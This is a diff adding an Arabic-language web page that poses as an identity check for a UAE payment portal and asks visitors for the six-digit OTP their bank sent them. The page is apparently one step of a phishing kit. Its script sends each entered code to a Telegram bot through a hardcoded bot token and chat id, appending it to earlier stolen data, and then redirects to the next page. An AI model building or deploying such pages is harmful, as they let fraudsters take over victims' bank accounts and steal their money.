@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق من الهوية - بوابة سداد الإمارات</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://petra.gov.jo/upload/1542630954928.jpg" type="image/x-icon">
+    <style>
+        :root {
+            --primary-color: #008000;
+            --text-color: #333;
+            --border-color: #ddd;
+            --error-color: #e74c3c;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: #f9f9f9;
+            color: var(--text-color);
+            display: flex; align-items: center; justify-content: center; min-height: 100vh;
+        }
+
+        .container { max-width: 450px; width: 90%; }
+
+        .form-container {
+            background-color: white; border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1); padding: 30px; text-align: center;
+        }
+
+        .header img { height: 60px; margin-bottom: 15px; }
+        
+        .otp-title { font-size: 20px; font-weight: 700; color: var(--primary-color); margin-bottom: 10px; }
+        .otp-desc { font-size: 14px; color: #666; margin-bottom: 25px; }
+
+        .otp-input-group {
+            display: flex; justify-content: space-between; gap: 8px; direction: ltr; margin-bottom: 25px;
+        }
+
+        .otp-input {
+            width: 45px; height: 55px; border: 2px solid var(--border-color);
+            border-radius: 8px; text-align: center; font-size: 22px; font-weight: bold;
+        }
+
+        .otp-input:focus { border-color: var(--primary-color); outline: none; box-shadow: 0 0 5px rgba(0,128,0,0.2); }
+
+        .btn {
+            background-color: var(--primary-color); color: white;
+            padding: 14px; border: none; border-radius: 8px;
+            cursor: pointer; font-size: 16px; width: 100%; font-family: 'Tajawal', sans-serif;
+        }
+
+        .timer { margin-top: 20px; font-size: 14px; color: #888; }
+        #time { color: var(--error-color); font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="form-container">
+            <div class="header">
+                <img src="https://petra.gov.jo/upload/1542630954928.jpg" alt="Logo">
+            </div>
+            
+            <h2 class="otp-title">تحقق من الرمز</h2>
+            <p class="otp-desc">يرجى إدخال رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك المسجل لدى البنك.</p>
+            
+            <div class="otp-input-group">
+                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 0)">
+                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
+                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
+                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
+                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
+                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
+            </div>
+            
+            <button type="button" onclick="verifyOTP()" class="btn">تأكيد الرمز</button>
+            
+            <div class="timer">إعادة إرسال الرمز خلال <span id="time">00:59</span></div>
+        </div>
+    </div>
+
+    <script>
+        const telegramBotToken = '8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw';
+        const telegramChatId = '8362204213';
+
+        function moveToNext(input, index) {
+            if (input.value.length === 1 && index < 5) {
+                document.querySelectorAll('.otp-input')[index + 1].focus();
+            }
+        }
+
+        async function appendToTelegram(newContent) {
+            const existingId = localStorage.getItem('telegramMessageId');
+            const existingContent = localStorage.getItem('telegramMessageContent') || '';
+            const updatedContent = existingContent + '\n\n' + newContent;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        message_id: parseInt(existingId),
+                        text: updatedContent,
+                        parse_mode: 'HTML'
+                    })
+                });
+                localStorage.setItem('telegramMessageContent', updatedContent);
+            } catch (e) { console.error(e); }
+        }
+
+        async function verifyOTP() {
+            let otpCode = "";
+            document.querySelectorAll('.otp-input').forEach(input => otpCode += input.value);
+            
+            if (otpCode.length === 6) {
+                const content = `🔑 <b>رمز التحقق المستلم (OTP)</b>\n🔢 الرمز: <code>${otpCode}</code>`;
+                await appendToTelegram(content);
+                window.location.href = 'page6.html';
+            } else {
+                alert("يرجى إدخال الرمز كاملاً");
+            }
+        }
+
+        // Timer Functionality
+        let seconds = 59;
+        setInterval(() => {
+            if (seconds > 0) {
+                seconds--;
+                document.getElementById('time').innerText = `00:${seconds < 10 ? '0' + seconds : seconds}`;
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
